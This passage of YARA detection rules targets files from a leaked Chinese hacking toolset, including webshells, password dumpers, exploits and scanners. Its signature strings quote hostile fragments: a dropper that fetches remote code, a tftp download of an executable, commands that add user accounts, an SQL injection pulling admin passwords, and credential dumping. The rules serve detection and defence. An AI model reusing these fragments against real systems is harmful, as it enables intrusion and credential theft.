T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file asp2.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:07:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"<%=server.mappath(request.servervariables(\\\"script_name\\\"))%>\" fullword ascii\n      $s2 = \"webshell</font> <font color=#00FF00>\" fullword ascii\n      $s3 = \"Userpwd = \\\"admin\\\"   'User Password\" fullword ascii\n   condition: \n      filesize < 10KB and all of them\n}\n\nrule CN_Honker_Webshell_FTP_MYSQL_MSSQL_SSH_RID3477 : CHINA DEMO T1021_004 T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file FTP MYSQL MSSQL SSH.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 15:31:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, T1021_004, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$_SESSION['hostlist'] = $hostlist = $_POST['hostlist'];\" fullword ascii\n      $s2 = \"Codz by <a href=\\\"http://www.sablog.net/blog\\\">4ngel</a><br />\" fullword ascii\n      $s3 = \"if ($conn_id = @ftp_connect($host, $ftpport)) {\" fullword ascii\n      $s4 = \"$_SESSION['sshport'] = $mssqlport = $_POST['sshport'];\" fullword ascii\n      $s5 = \"<title>ScanPass(FTP/MYSQL/MSSQL/SSH) by 4ngel</title>\" fullword ascii\n   condition: \n      filesize < 20KB and 3 of them\n}\n\nrule CN_Honker_Webshell_ASP_shell_RID31B7 : CHINA DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file shell.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:34:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"xPost.Open \\\"GET\\\",\\\"http://www.i0day.com/1.txt\\\",False //\" fullword ascii\n      $s2 = \"sGet.SaveToFile Server.MapPath(\\\"test.asp\\\"),2 //\" fullword ascii\n      $s3 = \"http://hi.baidu.com/xahacker/fuck.txt\" fullword ascii\n   condition: \n      filesize < 1KB and all of them\n}\n\nrule CN_Honker_Webshell_PHP_php7_RID3122 : CHINA DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file php7.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:09:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"---> '.$ports[$i].'<br>'; ob_flush(); flush(); } } echo '</div>'; return true; }\" ascii\n      $s1 = \"$getfile = isset($_POST['downfile']) ? $_POST['downfile'] : ''; $getaction = iss\" ascii\n   condition: \n      filesize < 300KB and all of them\n}\n\nrule CN_Honker_Webshell_ASP_rootkit_RID32AB : CHINA DEMO T1014 T1087_002 T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file rootkit.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 14:15:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, T1014, T1087_002, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"set ss=zsckm.get(\\\"Win32_ProcessSta\\\"&uyy&\\\"rtup\\\")\" fullword ascii\n      $s1 = \"If jzgm=\\\"\\\"Then jzgm=\\\"cmd.exe /c net user\\\"\" fullword ascii\n   condition: \n      filesize < 80KB and all of them\n}\n\nrule CN_Honker_Webshell_jspshell_RID31C1 : CHINA DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file jspshell.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:36:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"else if(Z.equals(\\\"M\\\")){String[] c={z1.substring(2),z1.substring(0,2),z2};Proce\" ascii\n      $s2 = \"String Z=EC(request.getParameter(Pwd)+\\\"\\\",cs);String z1=EC(request.getParameter\" ascii\n   condition: \n      filesize < 30KB and all of them\n}\n\nrule CN_Honker_Webshell_Serv_U_serv_u_RID33A3 : CHINA DEMO T1218_011 T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file serv-u.php\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 14:56:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2023-01-23\"\n      tags = \"CHINA, DEMO, T1218_011, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"@readfile(\\\"c:\\\\\\\\winnt\\\\\\\\system32\\\\\" ascii\n      $s2 = \"$sendbuf = \\\"PASS \\\".$_POST[\\\"password\\\"].\\\"\\\\r\\\\n\\\";\" fullword ascii\n      $s3 = \"$cmd=\\\"cmd /c rundll32.exe $path,install $openPort $activeStr\\\";\" fullword ascii\n   condition: \n      filesize < 435KB and all of them\n}\n\nrule CN_Honker_Webshell_WebShell_RID3172 : CHINA DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file WebShell.cgi\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:22:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$login = crypt($WebShell::Configuration::password, $salt);\" fullword ascii\n      $s2 = \"my $error = \\\"This command is not available in the restricted mode.\\\\n\\\";\" fullword ascii\n      $s3 = \"warn \\\"command: '$command'\\\\n\\\";\" fullword ascii\n   condition: \n      filesize < 30KB and 2 of them\n}\n\nrule CN_Honker_Webshell_Tuoku_script_mssql_2_RID3688 : CHINA DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file mssql.asp\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 16:59:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"sqlpass=request(\\\"sqlpass\\\")\" fullword ascii\n      $s2 = \"set file=fso.createtextfile(server.mappath(request(\\\"filename\\\")),8,true)\" fullword ascii\n      $s3 = \"<blockquote> ServerIP:&nbsp;&nbsp;&nbsp;\" fullword ascii\n   condition: \n      filesize < 3KB and all of them\n}\n\nrule CN_Honker_Webshell_ASP_asp1_RID3114 : CHINA DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file asp1.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:07:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"SItEuRl=\" ascii\n      $s2 = \"<%@ LANGUAGE = VBScript.Encode %><%\" fullword ascii\n      $s3 = \"Server.ScriptTimeout=\" ascii\n   condition: \n      filesize < 200KB and all of them\n}\n\nrule CN_Honker_Pwdump7_Pwdump7_RID308E : CHINA DEMO SCRIPT SUSP {\n   meta:\n      description = \"Script from disclosed CN Honker Pentest Toolset - file Pwdump7.bat\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 12:44:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, SCRIPT, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Pwdump7.exe >pass.txt\" fullword ascii\n   condition: \n      filesize < 1KB and all of them\n}\n\nrule CN_Honker_MAC_IPMAC_RID2D61 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file IPMAC.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 10:29:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Http://Www.YrYz.Net\" fullword wide\n      $s2 = \"IpMac.txt\" fullword ascii\n      $s3 = \"192.168.0.1\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 267KB and all of them\n}\n\nrule CN_Honker_GetSyskey_RID2E6F : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file GetSyskey.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:14:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"GetSyskey <SYSTEM registry file> [Output system key file]\" fullword ascii\n      $s4 = \"The system key file \\\"%s\\\" is created.\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 40KB and all of them\n}\n\nrule CN_Honker_Churrasco_RID2E71 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file Churrasco.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:14:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"HEAD9 /\" ascii\n      $s1 = \"logic_er\" fullword ascii\n      $s6 = \"proggam\" fullword ascii\n      $s16 = \"DtcGetTransactionManagerExA\" fullword ascii\n      $s17 = \"GetUserNameA\" fullword ascii\n      $s18 = \"OLEAUT\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1276KB and all of them\n}\n\nrule CN_Honker_mysql_injectV1_1_Creak_RID3335 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file mysql_injectV1.1_Creak.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 14:38:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"1http://192.169.200.200:2217/mysql_inject.php?id=1\" fullword ascii\n      $s12 = \"OnGetPassword\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 5890KB and all of them\n}\n\nrule CN_Honker_ASP_wshell_RID2E99 : CHINA DEMO FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file wshell.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:21:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<%@ LANGUAGE = VBScript.Encode %><%\" fullword ascii\n      $s1 = \"UserPass=\" \n      $s2 = \"VerName=\" \n      $s3 = \"StateName=\" \n   condition: \n      uint16 ( 0 ) == 0x253c and filesize < 200KB and all of them\n}\n\nrule CN_Honker_exp_iis7_RID2DEF : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file iis7.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 10:53:01\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"\\\\\\\\localhost\" fullword ascii\n      $s1 = \"iis.run\" fullword ascii\n      $s3 = \">Could not connecto %s\" fullword ascii\n      $s4 = \"WinSta0\\\\Default\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 60KB and all of them\n}\n\nrule CN_Honker_SegmentWeapon_RID3004 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file SegmentWeapon.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 12:21:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"C:\\\\WINDOWS\\\\system32\\\\msvbvm60.dll\\\\3\" fullword ascii\n      $s1 = \"http://www.nforange.com/inc/1.asp?\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule CN_Honker_Alien_iispwd_RID2F9F : CHINA DEMO HKTL SCRIPT {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file iispwd.vbs\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 12:05:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, HKTL, SCRIPT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"set IIs=objservice.GetObject(\\\"IIsWebServer\\\",childObjectName)\" fullword ascii\n      $s1 = \"wscript.echo \\\"from : http://www.xxx.com/\\\" &vbTab&vbCrLf\" fullword ascii\n   condition: \n      filesize < 3KB and all of them\n}\n\nrule CN_Honker_Md5CrackTools_RID2FA2 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file Md5CrackTools.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 12:05:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\" fullword ascii\n      $s2 = \",<a href='index.php?c=1&type=md5&hash=\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 4580KB and all of them\n}\n\nrule CN_Honker_CoolScan_scan_RID2FDD : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file scan.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 12:15:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"User-agent:\\\\s{0,32}(huasai|huasai/1.0|\\\\*)\" fullword ascii\n      $s1 = \"scan web.exe\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 3680KB and all of them\n}\n\nrule CN_Honker_COOKIE_CooKie_RID2F1A : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file CooKie.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:42:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s4 = \"-1 union select 1,username,password,4,5,6,7,8,9,10 from admin\" fullword ascii\n      $s5 = \"CooKie.exe\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 360KB and all of them\n}\n\nrule CN_Honker_wwwscan_1_wwwscan_RID31CA : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file wwwscan.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:37:31\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"%s www.target.com -p 8080 -m 10 -t 16\" fullword ascii\n      $s3 = \"GET /nothisexistpage.html HTTP/1.1\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 180KB and all of them\n}\n\nrule CN_Honker_D_injection_V2_32_RID30D8 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file D_injection_V2.32.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 12:57:11\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Missing %s property(CommandText does not return a result set{Error creating obje\" wide\n      $s1 = \"/tftp -i 219.134.46.245 get 9493.exe c:\\\\9394.exe\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 5000KB and all of them\n}\n\nrule CN_Honker_net_priv_esc2_RID2FFA : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file net-priv-esc2.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 12:20:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Usage:%s username password\" fullword ascii\n      $s2 = \"<www.darkst.com>\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 17KB and all of them\n}\n\nrule CN_Honker_Oracle_v1_0_Oracle_RID3167 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file Oracle.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:21:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"!http://localhost/index.asp?id=zhr\" fullword ascii\n      $s2 = \"OnGetPassword\" fullword ascii\n      $s3 = \"Mozilla/3.0 (compatible; Indy Library)\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 3455KB and all of them\n}\n\nrule CN_Honker_Interception_RID2FBB : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file Interception.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 12:09:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \".\\\\dat\\\\Hookmsgina.dll\" fullword ascii\n      $s5 = \"WinlogonHackEx \" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 160KB and all of them\n}\n\nrule CN_Honker_sig_3389_DUBrute_v3_0_RC3_3_0_RID3419 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file 3.0.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 15:16:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"explorer.exe http://bbs.yesmybi.net\" fullword ascii\n      $s1 = \"LOADER ERROR\" fullword ascii\n      $s9 = \"CryptGenRandom\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 395KB and all of them\n}\n\nrule CN_Honker_windows_exp_RID2F7E : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file exp.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:59:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"c:\\\\windows\\\\system32\\\\command.com /c \" fullword ascii\n      $s8 = \"OH,Sry.Too long command.\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 220KB and all of them\n}\n\nrule CN_Honker_safe3wvs_cgiscan_RID3130 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file cgiscan.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:11:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"httpclient.exe\" fullword wide\n      $s3 = \"www.safe3.com.cn\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 357KB and all of them\n}\n\nrule CN_Honker_pr_debug_RID2E0F : CHINA DEMO EXE FILE HKTL T1087_002 T1136 {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file debug.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 10:58:21\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL, T1087_002, T1136\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"-->Got WMI process Pid: %d \" ascii\n      $s2 = \"This exploit will execute \\\"net user temp 123456 /add & net localg\" ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 820KB and all of them\n}\n\nrule CN_Honker_T00ls_Lpk_Sethc_v4_0_RID31CE : CHINA DEMO EXE FILE HKTL T1546_008 {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file T00ls Lpk Sethc v4.0.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:38:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL, T1546_008\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"LOADER ERROR\" fullword ascii\n      $s15 = \"2011-2012 T00LS&RICES\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 2077KB and all of them\n}\n\nrule CN_Honker_Sword1_5_RID2D9B : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file Sword1.5.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 10:39:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"http://www.md5.com.cn\" fullword wide\n      $s2 = \"ListBox_Command\" fullword wide\n      $s3 = \"\\\\Set.ini\" wide\n      $s4 = \"OpenFileDialog1\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 740KB and all of them\n}\n\nrule CN_Honker_Havij_Havij_RID2F0A : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file Havij.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:40:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"User-Agent: %Inject_Here%\" fullword wide\n      $s2 = \"BACKUP database master to disk='d:\\\\Inetpub\\\\wwwroot\\\\1.zip'\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and all of them\n}\n\nrule CN_Honker_exp_ms11011_RID2E47 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file ms11011.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:07:41\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"\\\\i386\\\\Hello.pdb\" ascii\n      $s1 = \"OS not supported.\" fullword ascii\n      $s2 = \".Rich5\" fullword ascii\n      $s3 = \"Not supported.\" fullword wide\n      $s5 = \"cmd.exe\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule CN_Honker_DLL_passive_privilege_escalation_ws2help_RID3AC9 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file ws2help.dll\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 20:01:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"PassMinDll.dll\" fullword ascii\n      $s1 = \"\\\\ws2help.dll\" ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 30KB and all of them\n}\n\nrule CN_Honker_Webshell_RID2DFD : CHINA DEMO 